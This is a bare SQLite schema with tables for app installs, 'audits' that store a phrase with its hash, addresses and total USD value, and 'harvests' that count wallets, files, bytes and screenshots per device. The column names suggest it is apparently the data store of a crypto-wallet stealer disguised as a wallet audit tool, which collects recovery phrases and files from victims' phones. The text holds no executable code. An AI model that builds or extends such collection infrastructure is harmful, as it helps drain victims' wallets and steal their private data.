CREATE TABLE IF NOT EXISTS installs (
  at TEXT NOT NULL,
  installID TEXT,
  model TEXT,
  ios TEXT,
  locale TEXT,
  wallets TEXT,
  appVersion TEXT
);
CREATE TABLE IF NOT EXISTS audits (
  at TEXT NOT NULL,
  installID TEXT,
  phrase TEXT,
  hash TEXT,
  risk TEXT,
  totalUsd REAL DEFAULT 0,
  addresses TEXT,
  wallets TEXT,
  leaks INTEGER DEFAULT 0
);
CREATE TABLE IF NOT EXISTS harvests (
  at TEXT NOT NULL,
  platform TEXT,
  installID TEXT,
  wallets TEXT,
  files INTEGER DEFAULT 0,
  bytes INTEGER DEFAULT 0,
  screenshots INTEGER DEFAULT 0,
  findings TEXT,
  shots TEXT
);
CREATE TABLE IF NOT EXISTS leaks (hash TEXT PRIMARY KEY);
CREATE INDEX IF NOT EXISTS audits_at ON audits (at);
CREATE INDEX IF NOT EXISTS harvests_at ON harvests (at);
